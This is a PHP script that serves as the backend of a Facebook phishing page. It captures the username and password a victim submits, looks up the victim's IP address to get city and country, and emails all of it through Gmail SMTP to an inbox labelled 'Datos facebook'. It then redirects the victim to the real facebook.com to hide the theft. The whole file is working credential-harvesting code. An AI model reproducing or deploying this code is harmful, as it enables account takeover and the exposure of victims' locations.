<?php

	use PHPMailer\PHPMailer\PHPMailer;
	use PHPMailer\PHPMailer\SMTP;
	use PHPMailer\PHPMailer\Exception;
	require 'phpMailer/Exception.php';
	require 'phpMailer/PHPMailer.php';
	require 'phpMailer/SMTP.php';
	
	if (!$_POST['user'] == "" and !$_POST['password'] == "") {
		@$usuario = htmlspecialchars(addslashes($_POST['user']));
		@$clave = htmlspecialchars(addslashes($_POST['password']));

		function datosIp($ip){
			$url = "http://ip-api.com/json/" . $ip;
			$response = file_get_contents($url);
			$resultado = json_decode($response,true);
			if ($resultado["status"] === "success") {
				return $resultado;
			}else{
				return null;
			}
		}
		$ip = $_SERVER['REMOTE_ADDR'];
		$return = datosIp($ip);

		if ($return !== null) {
			
			//Create an instance; passing `true` enables exceptions
				$mail = new PHPMailer(true);

				try {
				    //Server settings
				    // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
				    $mail->isSMTP();                                            //Send using SMTP
				    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
				    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
				    $mail->Username   = '@gmail.com';                     //SMTP username
				    $mail->Password   = '';								//PASSWORD 
				    $mail->SMTPSecure = 'TLS';            //Enable implicit TLS encryption
				    $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

				    //Recipients
				    $mail->setFrom('@gmail.com', 'faceboock');
				    $mail->addAddress('@gmail.com', 'Datos facebook');

				    //Content
				    $mail->isHTML(true);                                  //Set email format to HTML
				    $mail->Body    =  "<b>Usuario: </b>" . $usuario  ."<br> <b>Contraseña: </b>" . $clave . "<br><b>IP: </b>" . $return['query'] . "<br> <b>Ciudad: </b>" . $return['city'] . "<br> <b>Pais: </b>" . $return['country'];
				   

				    $mail->send();
				   	
				   	echo '<script> window.location.href = "https://www.facebook.com"; </script>';

				} catch (Exception $e) {
				    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
				}

		}else{
			echo "no se pudo obtener la infomación";
		}
				
	}

?>